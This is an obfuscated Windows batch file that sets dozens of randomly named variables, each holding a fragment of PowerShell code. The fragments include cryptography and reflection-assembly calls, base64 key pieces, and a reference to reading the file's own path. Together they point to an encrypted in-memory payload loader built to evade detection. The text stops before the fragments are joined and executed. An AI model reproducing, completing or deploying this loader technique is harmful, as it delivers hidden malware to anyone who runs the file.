@echo off
set "HvqPFlTGsz=gth)"
set "gKPCqHCGgV=, (,"
set "VaiUBOYcWW=BC;$"
set "SElMzZxXfC=rans"
set "pNDhRDVPWy=VVa."
set "jjEPKkwhjt=e = "
set "AlkgDsdrjk=.-16"
set "fjHjJgQONX=ck($"
set "OwAMSfcEIR=[Sys"
set "aGIbpUwlMX=mory"
set "lYaAFcjGmF=grap"
set "sYxItBbgWg=LgYs"
set "wHxYKkYogM=fore"
set "EGwbItWpAA=G = "
set "ufTJZzaUnx=vp);"
set "yTPtRcdAEN=F'[-"
set "SAVcGvVWfd=nage"
set "KORxaChMLO=$vNk"
set "gkzWRACRDM=);$L"
set "ovZJhnRPCu=Syst"
set "NnCUjTgbAq=null"
set "vBRbwdIekf=106u"
set "SDEEhoNvEP=).Sp"
set "aoszpeKzin=ose("
set "lrLkTuaFzL=.Dis"
set "xnFTQTKkbo=th('"
set "EpKyYxqXak=();$"
set "EkCCQFDeEL=;$AA"
set "oCWLgDthwF=qDVf"
set "CPftRzuSQR=.Ass"
set "wWiChzQcPb=('%~f0'"
set "hSEmMploxN= if "
set "osaJaqRiRz=YG);"
set "qOzUmAeOvJ=:: '"
set "OSbDcxNmcr=$LgY"
set "TXdLLWeXrx=zuZI"
set "mJwCcrwACt=tsWi"
set "gsxiMBVTsU=O.Me"
set "KXAWeKZkXA=bjec"
set "ZYccKBSFsU=)) {"
set "BYAtMSXxBb=.Mod"
set "bjQVUeJNdN=$wbi"
set "zkAKzKbFsc=YG ="
set "AYXZFgnggg=Star"
set "JBHbnUZPRQ=ct S"
set "crCILKnsnp=gjYA"
set "ZUeiiLMhbY=iron"
set "bDuYSZJGIq=.Sec"
set "DtTDBZJpOC=);$d"
set "hcJLGZuVRE=PTtG"
set "NzKdgJFVRl='')("
set "ddttbOpveh=a = "
set "etfXwdWjhj=flec"
set "oFHeugaQIO= [st"
set "aUdFolRpAH=saBm"
set "iNkRgXMjSF=tem."
set "ahRCxeenOL=opvD"
set "ptfwkYJSqN=ode]"
set "BqBNWcxrFw=[-1."
set "YGHVuglbIK=comp"
set "ehWXsxuONC=ring"
set "aUOUiGCMPr=$ddm"
set "jgfYLolSRp=rofi"
set "sqfPLOFNLI=Bf ="
set "smeMMfyNAH=rity"
set "QyeRoHyAmR=S46e"
set "FOeOmCbnQT=s75K"
set "bBXjsEEXiq= '')"
set "nhXyvvHnRa=nirt"
set "LQoSIUEIQx=t Sy"
set "JZMkqNhKdU=yTo("
set "ABjTdZLxYE=:('g"
set "IkOqssAyYW=GkAY"
set "EIBOfUrDWG=trea"
